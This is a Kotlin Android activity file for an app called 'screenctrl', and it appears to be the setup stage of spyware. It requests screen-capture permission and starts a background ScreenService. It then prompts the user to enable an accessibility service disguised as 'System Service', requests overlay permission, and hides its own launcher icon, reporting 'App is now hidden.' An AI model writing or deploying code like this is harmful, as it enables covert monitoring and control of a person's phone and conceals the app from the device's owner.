package com.yourname.screenctrl

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*

class MainActivity : AppCompatActivity() {
    
    private val SCREEN_CAPTURE_REQUEST = 1001
    private val OVERLAY_PERMISSION_REQUEST = 1002
    private lateinit var mediaProjectionManager: MediaProjectionManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestAllPermissions()
    }

    private fun requestAllPermissions() {
        mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), SCREEN_CAPTURE_REQUEST)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        when (requestCode) {
            SCREEN_CAPTURE_REQUEST -> {
                if (resultCode == Activity.RESULT_OK && data != null) {
                    val prefs = getSharedPreferences("screen_ctrl", MODE_PRIVATE)
                    prefs.edit().putInt("resultCode", resultCode).apply()
                    
                    val serviceIntent = Intent(this, ScreenService::class.java).apply {
                        putExtra("resultCode", resultCode)
                        putExtra("data", data)
                    }
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(serviceIntent)
                    } else {
                        startService(serviceIntent)
                    }
                    
                    requestAccessibilityPermission()
                }
            }
        }
    }

    private fun requestAccessibilityPermission() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
        Toast.makeText(this, "Please enable 'System Service' in Accessibility", Toast.LENGTH_LONG).show()
        
        GlobalScope.launch {
            delay(5000)
            withContext(Dispatchers.Main) {
                requestOverlayPermission()
            }
        }
    }

    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
                startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST)
            } else {
                hideAppIcon()
            }
        } else {
            hideAppIcon()
        }
    }

    private fun hideAppIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        
        Toast.makeText(this, "Setup complete! App is now hidden.", Toast.LENGTH_LONG).show()
        moveTaskToBack(true)
        finish()
    }
}
